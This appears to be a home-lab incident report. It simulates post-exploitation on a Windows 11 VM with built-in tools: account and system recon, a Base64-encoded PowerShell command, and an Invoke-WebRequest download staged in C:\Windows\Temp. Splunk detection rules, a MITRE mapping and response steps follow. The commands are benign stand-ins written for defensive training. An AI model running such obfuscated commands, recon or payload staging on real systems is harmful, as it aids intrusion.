# INC-003: Post-Exploitation PowerShell Execution

## Incident Details

| Field | Detail |
|---|---|
| Incident ID | INC-003 |
| Date | April 28, 2026 |
| Machine | 192.168.56.104 (Windows 11 — post-compromise) |
| Execution Method | Windows PowerShell — Living-off-the-Land |
| MITRE | T1059.001, T1087, T1082, T1105, T1074, T1027 |

---

## Objective

After gaining remote access in INC-002, simulate post-exploitation 
activity including system reconnaissance, obfuscated command 
execution, and payload staging — all using built-in Windows tools.

---

## Steps Taken

1. Ran identity and privilege verification (whoami)
2. Enumerated all user accounts (net user)
3. Checked administrator group membership (net localgroup administrators)
4. Fingerprinted full system (systeminfo)
5. Executed Base64 encoded PowerShell command
6. Simulated payload download via Invoke-WebRequest
7. Staged files in C:\Windows\Temp

---

## Commands Executed

```powershell
whoami
net user
net localgroup administrators
systeminfo
powershell -EncodedCommand aQBwAGMAbwBuAGYAaQBnAA==
powershell -Command "Invoke-WebRequest -Uri http://example.com -OutFile C:\Windows\Temp\test.txt"
echo "not malware" > C:\Windows\Temp\notmalware.txt
dir C:\Windows\Temp\
```

Note: The encoded command decodes to ipconfig. The encoding 
technique is identical to how real malware obfuscates execution.

---

## Process Tree (Splunk Evidence)

Splunk EventCode 4688 captured the following parent-child chain:

powershell.exe
└─ whoami.exe
└─ net.exe
└─ systeminfo.exe

This process tree is a high-confidence indicator of 
post-exploitation activity. Legitimate users do not run 
these tools sequentially from a PowerShell parent.

---

## Detection Rules

**Encoded PowerShell:**
```spl
index=main EventCode=4688
CommandLine="*EncodedCommand*" OR CommandLine="*-enc *"
| table _time, User, CommandLine, Computer
| eval alert="SUSPICIOUS ENCODED POWERSHELL DETECTED"
| eval MITRE="T1059.001"
```

**Recon Command Sequence:**
```spl
index=main EventCode=4688
New_Process_Name="*whoami.exe*" OR New_Process_Name="*systeminfo.exe*"
OR New_Process_Name="*net.exe*"
| table _time, host, New_Process_Name, Creator_Process_Name
| eval alert="POST-EXPLOITATION RECON DETECTED"
| eval MITRE="T1087"
```

**File Write to Temp:**
```spl
index=main EventCode=11
TargetFilename="*\\Temp\\*"
Image="*powershell*"
| table _time, Image, TargetFilename, User
| eval alert="SUSPICIOUS FILE WRITE TO TEMP"
| eval MITRE="T1074"
```

---

## Screenshots

Recon Commands

<img width="659" height="446" alt="powershell recon commands 1" src="https://github.com/user-attachments/assets/de3f16ad-e47d-48a4-81c1-f57a97ff4a94" />
<img width="509" height="325" alt="powershell recon command 2" src="https://github.com/user-attachments/assets/03531602-faa1-4c66-9cbd-633b012bb26b" />
<img width="508" height="224" alt="poweshell suspicious file activity" src="https://github.com/user-attachments/assets/98aa3bc9-65dc-4a7e-a783-39930911fe32" />

Splunk Process Tree
<img width="959" height="401" alt="All Recon Activity" src="https://github.com/user-attachments/assets/982bacaf-ce97-460b-9aee-25a563ec4106" />
<img width="959" height="403" alt="Identification of remote attacker vector" src="https://github.com/user-attachments/assets/ecb30ce9-c630-4eff-988a-b67016d5e4f9" />
<img width="957" height="403" alt="Suspicious shell execution" src="https://github.com/user-attachments/assets/5e3474d4-5797-4b89-9bb4-9214a288df9c" />
<img width="956" height="398" alt="Discovery tool execution" src="https://github.com/user-attachments/assets/587bc9a7-72fa-4179-92a3-a8cc0a36504f" />
<img width="959" height="400" alt="Detection of post exploitation reconnaissance" src="https://github.com/user-attachments/assets/d6ff06d1-8026-41b7-a7f3-b8e1eff23f3b" />

Encoded Command
<img width="359" height="218" alt="powershell encoded command" src="https://github.com/user-attachments/assets/7bde080a-5b0c-4828-bf6e-896e999e3275" />


---

## MITRE ATT&CK

| Technique ID | Name | Application |
|---|---|---|
| T1059.001 | PowerShell | All commands executed via PowerShell |
| T1027 | Obfuscated Files | Base64 encoded command to bypass keyword detection |
| T1087 | Account Discovery | net user and net localgroup enumeration |
| T1082 | System Info Discovery | systeminfo full fingerprint |
| T1105 | Ingress Tool Transfer | Invoke-WebRequest payload download |
| T1074 | Data Staged | Files written to C:\Windows\Temp |

---

## Response Actions

1. Isolate machine from network immediately
2. Collect memory image before rebooting
3. Hash and preserve all files in C:\Windows\Temp
4. Review all processes run by ron and targetuser in past 24 hours
5. Implement PowerShell Script Block Logging
6. Deploy EDR with behavioural detection

